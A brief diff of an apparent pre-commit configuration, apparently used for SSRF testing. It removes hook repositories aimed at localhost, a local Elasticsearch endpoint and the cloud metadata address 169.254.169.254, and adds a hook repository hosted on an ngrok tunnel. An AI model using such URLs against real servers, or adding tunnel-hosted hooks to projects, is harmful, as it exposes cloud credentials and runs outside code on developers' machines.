@@ -1,13 +1,5 @@
 repos:
-  - repo: http://127.0.0.1:1234/ssrf-test
+  - repo: https://nightless-declan-bothersomely.ngrok-free.dev/hook-repo
     rev: v1.0.0
     hooks:
       - id: test-hook
-  - repo: http://169.254.169.254/latest/meta-data/
-    rev: v1.0.0
-    hooks:
-      - id: metadata-hook
-  - repo: http://localhost:9200/_cluster/health
-    rev: v1.0.0
-    hooks:
-      - id: elastic-hook
